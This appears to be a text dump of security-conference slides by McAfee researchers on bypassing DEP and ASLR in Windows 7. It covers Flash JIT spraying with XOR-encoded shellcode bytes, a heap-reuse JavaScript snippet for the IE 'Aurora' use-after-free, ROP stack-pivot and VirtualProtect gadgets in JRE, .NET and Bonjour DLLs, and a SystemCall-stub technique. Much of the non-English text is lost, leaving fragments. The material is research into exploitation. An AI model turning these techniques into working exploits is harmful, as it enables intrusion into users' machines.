 windows 7
Chen XiaoBo Xiao_Chen@McAfee.com
Xie Jun Jun_Xie@McAfee.com

Windows 
· GS ­ Stack cookies EIP ­ SEH chains/GS
· SafeSEH & SEHOP ­ SEH handler  ­ SEH handler SafeSEHDLL ·  DNS RPC buffer overflow ­ SEH chain 
· Heap Protection ­ Safe unlinking ­ Heap cookies ­ Heap metadata encryption ­ Safe LAL (Lookaside lists) ­  vista / 2008 / win7 ­ Lookaside  XP/2003

Windows 
· DEP ­ NX support ­ (Permanent) DEP
· IE 8 DEP is permanent · NtSetProcessInformation() permanent DEP
­ Ret-to-libc or ROP (Return-Oriented Programming ) shellcode DEP
· ASLR ­ Address space layout randomization() ­ Images / stack / heap / PEB / TEB ­ ret-to-libc

Windows 
· Brute force
­ IEDLL ­ 
· Information leak
­  ­ 0day


· Brower memory protection bypasses
­ By Alexander Sotirov & Mark Dowd ­ Flash
· FlashASLR
­ Java
· Java  RWX  · Java.exe(IE)
­ .NET 
· ASLR&DEP · IE 8internet zone.NET


· Flash JIT
­ By Dion Blazakis at BlackHat DC 2010 ­ 
· DEP&ASLR
­ IESWF
· JIT
­ Flash 10.1
· JIT


· Flash JIT
­ ActionScriptshellcode
· XOR · XOR (0x35) · 0x3cnopx86
­ CMP AL, 0x35 · shellcodeNtAllocateVirtualMemory()/VirtualAlloc()
­ PAGE_EXECUTE_READWRITE ­ shellcode



· Flash JIT

­ NtAllocateVirtualMemory()

· 3589e5eb01 · 3583ec103c · 356a40eb01 · 3531c0eb01 · 35b410eb01 · 355031db3c · 35b740eb01 · 35895d043c · 358d5d043c · 355331db3c · 356a00eb01 · 35895d083c · 358d5d083c · 35536aff3c · 356a00eb01

xor eax,1EBE589h xor eax,3C10EC83h xor eax,1EB406Ah xor eax,1EBC031h xor eax,1EB10B4h xor eax,3CDB3150h xor eax,1EB40B7h xor eax,3C045D89h xor eax,3C045D8Dh xor eax,3CDB3153h xor eax,1EB006Ah xor eax,3C085D89h xor eax,3C085D8Dh xor eax,3CFF6A53h xor eax,1EB006Ah


· Flash JIT
­ JIT + 1x86 shellcode ­ shellcode ­  shellcode2as.exe  ­ shellcode ActionScript

Case study #1
· Flash JIT with IE aurora on windows 7
­ IE aurora 
· use-after-free  ·  JS/DOM 
­ Root Cause
· EVENTPARAM  CTreeNode  · element.innerHTML CTreeNode  · eventsrcElementtoElement

Case study #1
· Flash JIT with IE aurora on windows 7
­ 
·  CTreeNode 
­ IE 7: 0x34 ­ IE 8: 0x4c
· HTML
­ Go exploit it

Case study #1

· Flash JIT with IE aurora on windows 7

­ var reuse_object = new Array();

­ for(var x=0;x<9200;x++) {

­

reuse_object.push(document.createElement("img"));

­}

­ for (var x=0; x < 0x4c/4; i ++)

­

var string_data = unescape("%u3344%u1122");

­

­ for(var x=0; x < reuse_object.length; x++) {

­

reuse_object[x].src = string_data;

­}

Case study #1
· Flash JIT Demo on windows 7


· 3rd Party IE plugin on windows 7
­ JRE ASLR ­ jp2ssv.dll  ­  JRE DLLs ­ applet
· <applet code="some.class"></applet>


· 3rd Party IE plugin on windows 7
­ Bonjour for iTunes / QT ­ Adobe Shockwave (dirapi.dll)
· Assured Exploitation (cansecwest) · DEP in depth (syscan 2010)
­ DLLASLR


· 3rd Party IE plugin on windows 7
­ JRE ­ ESP
· LEA ESP, [REG] RET · LEA ESP, [REG + XX] RET · PUSH REG POP ESP RET · XCHG REG, ESP RET · XCHG ESP, REG RET · MOV ESP, REG RET · MOV REG, FS:[0] RET · : CALL [REG + ???] and XCHG REG, ESP RET ·...
­ ROP shellcode


· 3rd Party IE plugin on windows 7
­ shellcode RWX ­  call VirtualProtect() ­ WriteProcessMemory()
· NTWriteProcessMemory() ·  ()DEP
­ RWXshellcode
·  Adobe TIFF exploit



· 3rd Party IE plugin on windows 7

­ msdnsNSP.dll ESP

· mdnsNSP!DllUnregisterServer+0x7b:

· 1608114b 94

xchg eax,esp

· 1608114c 0100

add dword ptr [eax],eax

· 1608114e 00c3

add bl,al

· 16081150 b826270000 mov eax,2726h

· 16081155 c21400

ret 14h

Case study #2

· IE aurora exploit with JRE on windows 7

­ JREESP

· awt!Java_sun_java2d_loops_DrawRect_DrawRect+0x6de:

· 6d005f6e 94

xchg eax,esp

· 6d005f6f c3

ret

· jp2iexp!DllGetClassObject+0x1496:

· 6d417e6c 94

xchg eax,esp

· 6d417e6d c3

ret

Case study #2
· IE aurora exploit with JRE on windows 7
­ JS HeapSpray
· ROP shellcodeDEPshellcode · 

Case study #2

· IE aurora exploit with JRE on windows 7

­ Call [VirtualProtect] in jvm.dll

· jvm!JVM_FindSignal+0x5732b:

· 6d97c9cb ff1588d09f6d call dword ptr [jvm!JVM_FindSignal+0xd79e8 (6d9fd088)]

· 6d97c9d1 f7d8

neg eax

· 6d97c9d3 1bc0

sbb eax,eax

· 6d97c9d5 f7d8

neg eax

· 6d97c9d7 5f

pop edi

· 6d97c9d8 5e

pop esi

· 6d97c9d9 5d

pop ebp

· 6d97c9da c3

ret

­  VirtualProtect(mem, 0x2000, 0x40, ptr) heapRWX

Case study #2
· IE aurora Java ROP demo on windows 7


· .NET Framework on windows 7
­ IE 8  .NET(internet zone) ­ exploit.dll ­ IEtrusted zone


· .NET Framework on windows 7
­ 
­ Windows 7 .NET framework (1.0 ­ 3.5) ­ V1.0 ­ v2.0  ­ DLLASLR !!


· .NET Framework on windows 7
­ .NET 2.0 C#  ­ IE.NET DLLs !! ­ :
· .NET · IE .NET IE mime filter DLL

New exploitation technique
· .NET Framework on windows 7
­ ModLoad: 63f00000 63f0c000
C:\Windows\Microsoft.NET\Framework\v2.0.50727\mscorie.dll
­ DLLASLR !!



· IE aurora exploit with .NET Framework on windows 7

­ ESP

· mscorie!DllGetClassObjectInternal+0x3452:

· 63f0575b 94

xchg eax,esp

· 63f0575c 8b00

mov eax,dword ptr [eax]

· 63f0575e 890424

mov dword ptr [esp],eax

· 63f05761 c3

ret



· IE aurora exploit with .NET Framework on windows 7

­ VirtualProtect() Heap

· mscorie!DllGetClassObjectInternal+0x29e2:

· 63f04ceb 55

push ebp

· 63f04cec 8bec

mov ebp,esp

· 63f04cee ff7518

push dword ptr [ebp+18h]

· 63f04cf1 ff7514

push dword ptr [ebp+14h]

· 63f04cf4 ff7510

push dword ptr [ebp+10h]

· 63f04cf7 ff750c

push dword ptr [ebp+0Ch]

· 63f04cfa ff150011f063 call dword ptr [mscorie+0x1100 (63f01100)] (VirtualProtect)

Case study #3
· IE aurora .NET ROP demo on windows 7



· SystemCall On Windows

­ 0:007> dt _KUSER_SHARED_DATA 0x7ffe0000

ntdll!_KUSER_SHARED_DATA

... +0x300 SystemCall

: 0x772864f0

+0x304 SystemCallReturn : 0x772864f4

0:007> u 772864f0

ntdll!KiFastSystemCall:

772864f0 8bd4

mov edx,esp

772864f2 0f34

sysenter

ntdll!KiFastSystemCallRet:

­ SystemCall  0x7ffe0300 !!

New exploitation technique

· SystemCall On Windows

­ Windows user-mode enter to Kernel-mode like this

­ 0:019> u ZwCreateProcess

ntdll!NtCreateProcess: 77284ae0 b84f000000 mov eax,4Fh

77284ae5 ba0003fe7f mov edx,offset SharedUserData!SystemCallStub (7ffe0300)

77284aea ff12

call dword ptr [edx]

77284aec c22000

ret 20h

­ System Call ­ System CallDEP&ALSR

Case study #4

· IE MS08-078 exploit with SystemCall on windows

­ SystemCall

­ exploitSystemCall

· .text:461E3D30 .... .text:461E3D4C .text:461E3D4E .text:461E3D4F .text:461E3D50

mov eax, [esi] //eax==0x0a0a11c8 // 0x11c8 be a systemcall ID
mov ecx, [eax] //[0x0a0a11c8]==0x7ffe027c push edi push eax //eax==0x0a0a11c8 call dword ptr [ecx+84h] //call [0x7FFE0300] SystemCall

· NtUserLockWorkStation

mov eax,11c8h mov edx,offset SharedUserData!SystemCallStub (7ffe0300) call dword ptr [edx]

Case study #4

· System call on x64

­ 7ffe0300 KiFastSystemCall

­ call dword ptr fs:[0C0h]

· 0:000> u NtQueryInformationToken

· ntdll!NtQueryInformationToken:

· 77d9fb38 b81e000000 mov eax,1Eh

· 77d9fb3d 33c9

xor ecx,ecx

· 77d9fb3f 8d542404 lea edx,[esp+4]

· 77d9fb43 64ff15c0000000 call dword ptr fs:[0C0h]

· 77d9fb4a 83c404

add esp,4

· 77d9fb4d c21400

ret 14h

The End
· 4ASLR&DEP

Thanks
Q&A

